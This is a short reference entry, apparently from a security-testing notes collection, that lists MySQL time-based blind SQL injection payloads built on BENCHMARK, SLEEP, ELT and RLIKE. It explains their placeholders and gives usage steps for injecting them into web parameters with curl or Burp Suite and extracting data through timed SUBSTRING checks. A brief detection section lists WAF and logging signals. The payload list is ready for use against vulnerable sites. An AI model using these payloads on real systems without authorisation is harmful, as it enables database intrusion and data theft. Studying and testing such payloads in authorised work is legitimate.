---
type: code
language: SQL
verified: true
tags:
  - sql-injection
  - payload
  - time-based
platforms:
  - Web
validated: true
---

# MySQL-Time-Based-Injection-Payloads

## Code

```sql
+BENCHMARK(40000000,SHA1(1337))+
'%2Bbenchmark(3200,SHA1(1))%2B'
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
```

## Description

This code snippet contains various MySQL-compatible payloads for time-based blind SQL injection. They leverage BENCHMARK for CPU delays, SLEEP for timed pauses, and conditional logic (e.g., ELT, RLIKE) to infer data based on response times. These are injected into vulnerable parameters to test and extract information without visible output.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [RANDNUM] | Random number for condition (avoids caching) | 1 |
| [SLEEPTIME] | Delay duration in seconds | 5 |
| [RANDSTR] | Random string for MD5/SHA1 input | abc123 |

## Usage

Inject these payloads into URL parameters or POST data in tools like curl or Burp Suite. For example, append to a query: q=1' AND [payload]--. Measure response time; a delay indicates true condition. Use in procedures like [[procedures/Time-Based-Blind-SQL-Injection-in-MySQL]] for manual testing or data extraction (e.g., replace condition with SUBSTRING checks).

## Detection

- WAF rules blocking SLEEP/BENCHMARK keywords or unusual query durations.
- Database logs showing long-running queries with these functions.
- Application monitoring for response times >5s on user inputs.
- Network traffic analysis for repeated requests with encoded SQL patterns.

## Related

- [[procedures/Time-Based-Blind-SQL-Injection-in-MySQL]]
- [[tools/sqlmap]]
